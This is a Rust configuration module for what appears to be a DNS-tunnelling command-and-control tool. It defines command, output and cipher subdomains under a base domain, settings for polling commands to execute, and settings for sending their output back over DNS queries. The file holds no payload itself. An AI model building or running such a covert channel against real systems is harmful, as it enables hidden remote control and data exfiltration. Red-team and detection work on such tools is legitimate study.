use serde::Deserialize;
use std::time::Duration;

#[derive(Debug, Deserialize)]
pub struct Config {
    pub dns_server: String,
    pub base_domain: String,
    pub max_frags: usize,
    pub max_label_len: usize,
    pub delay_check_comando: f32,
    pub delay_respuesta: f32,
    pub dns_timeout: f32,
}

impl Config {
    // Command subdomain
    pub fn cmd_subdomain(&self) -> String {
        format!("cmd.{}", self.base_domain)
    }

    // Output subdomain
    pub fn output_subdomain(&self) -> String {
        format!("output.{}", self.base_domain)
    }

    // Crypto subdomain
    pub fn cipher_subdomain(&self) -> String {
        format!("cipher.{}", self.base_domain)
    }

    pub fn check_delay(&self) -> Duration {
        Duration::from_secs_f32(self.delay_check_comando)
    }

    pub fn response_delay(&self) -> Duration {
        Duration::from_secs_f32(self.delay_respuesta)
    }

    pub fn dns_timeout(&self) -> Duration {
        Duration::from_secs_f32(self.dns_timeout)
    }
}

impl Default for Config {
    fn default() -> Self {
        Self {
            dns_server: "127.0.0.1".to_string(), // IP DNS server
            base_domain: "guchihacker.org".to_string(), // Domain for the dns requests
            max_frags: 100,
            max_label_len: 63,
            delay_check_comando: 1.0, // Delay check command to execute in the server
            delay_respuesta: 0.0, // Delay send the response of the command packets
            dns_timeout: 20.0, // timeout if the server not response
        }
    }
} 